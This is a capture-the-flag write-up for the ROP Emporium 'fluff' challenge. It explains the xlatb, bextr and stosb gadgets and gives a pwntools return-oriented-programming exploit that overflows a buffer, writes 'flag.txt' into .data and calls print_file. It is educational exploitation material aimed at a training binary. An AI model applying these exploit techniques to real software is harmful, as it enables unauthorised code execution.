# FLUFF

[fluff](https://ropemporium.com/challenge/fluff.html)

Ever heard how x86 is Complex Instruction Set Computer (CISC) architecture. This challenge is where this property rears its ugly head.

Instead of our familiar `mov [reg], reg` gadgets, we are faced with this:

```
$ objdump -M intel -D ./fluff
...
0000000000400628 <questionableGadgets>:
  400628:       d7                      xlat   BYTE PTR ds:[rbx]
  400629:       c3                      ret    
  40062a:       5a                      pop    rdx
  40062b:       59                      pop    rcx
  40062c:       48 81 c1 f2 3e 00 00    add    rcx,0x3ef2
  400633:       c4 e2 e8 f7 d9          bextr  rbx,rcx,rdx
  400638:       c3                      ret    
  400639:       aa                      stos   BYTE PTR es:[rdi],al
  40063a:       c3                      ret    
  40063b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
...
```

Maybe ROPgadget will show us something different?

```
$ ROPgadget --binary ./fluff --ropchain
...
0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
0x0000000000400602 : mov ebp, esp ; pop rbp ; jmp 0x400590
0x000000000040057c : mov edi, 0x601038 ; jmp rax
0x0000000000400601 : mov rbp, rsp ; pop rbp ; jmp 0x400590
...
```

Nothing. We can't even move our string into `.data`.

Let's take a look at what the *questionableGadgets* can offer us then. What we can immediately notice is that there are 3 new x86 instructions that we haven't seen before.

| Instruction | Description |
| - | - |
| xlatb | Set `al` to the memory location at `rbx+al`. Equivalent to `mov BYTE al, [rbx+al]`. |
| bextr rbx, rcx, rdx | Extract bits from `rcx` into `rbx`, starting from the bit specified by the first byte of `rdx` for a maximum length specified by the second byte of `rdx`. |
| stosb | Set the byte at memory location `rdi` to the value of `al`, then increment `rdi` by one. Equivalent to `mov BYTE [rdi], al ; add rdi, 1`. |

Theoretically we can set `rbx` to anything we want by manipulating `rcx` and `rdx`. For example, by setting it the value of `rcx` to `0xaaaabbbbccccdddd` and making sure that the first byte of `rdx` is 0 and the second byte is 64 (i.e. `rdx` is `0x4000`), then we can set `rbx` to `0xaaaabbbbccccdddd`. This is pretty much the same as `mov rbx, rcx`.

```python
from pwn import *
...
POPRDXRCXBEXTR = p64(0x40062a) # pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret

# set rbx to 0xaaaabbbbccccdddd

attack = b"A"*0x28
attack += POPRDXRCXBEXTR
attack += p64(0x4000) # set rdx to 0x4000
# set rcx to 0xaaaabbbbccccdddd
# we have to minus off 0x3ef2 to cancel out the next instruction which adds 0x3ef2 to rcx
attack += p64(0xaaaabbbbccccdddd - 0x3ef2)
...
```

Next we can use the `xlatb` gadget to set `al` to the byte at `rbx+al`. Then, we can copy that byte to the memory address pointed by `rdi` using `stosb`.

This is the basic principle for how we are going to move our "flag.txt" to `.data`.

Here are some extra gadgets and memory addresses that I thought would be useful.

```
0x400610 : mov eax, 0 ; pop rbp ; ret
0x4006a3 : pop rdi ; ret
0x400295 : ret
0x601028 : .data
```

## The attack

We start off by setting `rdi` to the location of the `.data` section and set `al` to 0.

```python
from pwn import *
...
DATA = 0x601028
POPRDI = p64(0x4006a3) # pop rdi ; ret
MOVEAX0_POPRBP = p64(0x400610) # mov eax, 0 ; pop rbp ; ret
...
attack = b"A"*0x28
attack += POPRDI + p64(DATA) # set rdi to data
attack += MOVEAX0_POPRBP + b"12345678" # junk data for rbp
...
```

Next, we have to move each byte in "flag.txt" into `.data`. Since we cannot pop our flag and move it into `.data`, we have to use random bytes in the binary to copy into `.data`. We can do this by using the `search` method to find our bytes.

```python
...
exe = context.binary = ELF('./fluff')
...
for byte in b"flag.txt":
    byteloc = next(exe.search(byte))
...
```

Now that we know where each byte is, we can start copying them over to `.data`. Since the `xlatb` instruction copies the data from `rbx+al`, we have to cancel out the effect of `al` by minusing it off on top off subtracting `0x3ef2`. This means that when `pop rcx` is performed, `rcx` should take the value `byteloc - al - 0x3ef2`. That way, the value of `al` when we do `xlatb` would be copied from the byte located at `byteloc`. After that, we can copy the value of `al` to `.data` using `stosb`. Since `rdi` is incremented in the `stosb` instruction, we don't have to increment the value of `rdi` ourselves when we copy over our new byte.

```python
from exe import *
...
POPRDXRCX = p64(0x40062a) # pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
STOSB = p64(0x400639) # stosb [rdi], al ; ret
XLATB = p64(0x400628) # xlatb ; ret
...
current_al = 0 # al was set to 0 when we did: mov eax, 0 ; push rbp ; ret
for byte in b"flag.txt":
    byteloc = next(exe.search(byte))
    # set rbx to byteloc-current_al
    attack += POPRDXRCX + p64(0x4000) + p64(byteloc-current_al-0x3ef2)
    # al = *(rbx + al) = *( (byteloc-current_al) + current_al ) = *byteloc
    attack += XLATB
    attack += STOSB
    # no need to increment rdi because stosb does that for us
    current_al = byte
...
```

After this for loop, "flag.txt" is in place. We can set `rdi` back to `.data` and return to `print_file()`.

```python
from pwn import *
...
DATA = 0x601028
RET = p64(0x400295) # ret
POPRDI = p64(0x4006a3) # pop rdi ; ret
...
attack += POPRDI + p64(DATA) + PRINT_FILE
...
```

Our attack should look like this:

```python
from pwn import *
...
DATA = 0x601028
RET = p64(0x400295) # ret
POPRDI = p64(0x4006a3) # pop rdi ; ret
POPRDXRCX = p64(0x40062a) # pop rdx ; pop rcx ; add rcx, 0x3ef2 ; bextr rbx, rcx, rdx ; ret
BEXTRRBXRCXRDX = p64(0x400633) # bextr rbx, rcx, rdx ; ret
STOSB = p64(0x400639) # stosb [rdi], al ; ret
XLATB = p64(0x400628) # xlatb ; ret
MOVEAX0_POPRBP = p64(0x400610) # mov eax, 0 ; pop rbp ; ret
PRINT_FILE = p64(0x400510) # print_file

attack = b"A"*0x28
attack += POPRDI + p64(DATA) # set rdi to data
attack += MOVEAX0_POPRBP + b"12345678" # junk data for rbp

current_al = 0 # zeroed out by MOVEAX0_POPRBP
for byte in b"flag.txt":
    byteloc = next(exe.search(byte))
    # set rbx to byteloc-current_al
    attack += POPRDXRCX + p64(0x4000) + p64(byteloc-current_al-0x3ef2)
    # al = *(rbx + al) = *( (byteloc-current_al) + current_al ) = *byteloc
    attack += XLATB
    attack += STOSB
    # no need to increment rdi because stosb does that for us
    current_al = byte
    
attack += POPRDI + p64(DATA) + PRINT_FILE

io.sendline(attack)
...
```
